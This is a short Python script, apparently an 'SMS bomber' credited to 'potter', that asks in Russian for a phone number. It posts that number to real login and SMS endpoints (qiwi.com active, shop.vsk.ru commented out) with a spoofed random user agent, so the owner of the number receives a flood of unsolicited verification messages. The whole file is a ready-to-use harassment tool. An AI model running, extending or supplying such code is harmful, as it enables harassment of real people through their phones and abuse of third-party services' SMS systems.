import requests, fake_useragent

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}

print("""
 ____                  _
| __ )  ___  _ __ ___ | |__
|  _ \ / _ \| '_ ` _ \| '_ \\
| |_) | (_) | | | | | | |_) |
|____/ \___/|_| |_| |_|_.__/

                 made by potter
""")

NUMBER = input("Введите номер без +: ")

# try:
#     a1 = requests.post('https://shop.vsk.ru/ajax/auth/postSms/', headers=headers, data={'phone' : NUMBER})
#     print('shop.vsk.ru message sent')
# except:
#     print('Что-то пошло не так')

try:
    a2 = requests.post('https://qiwi.com/oauth/authorize', headers=headers, data={'username' : NUMBER})
    print('qiwi.com message sent')
except:
    print('Что-то пошло не так')


input('Нажмите Enter, чтобы продолжить')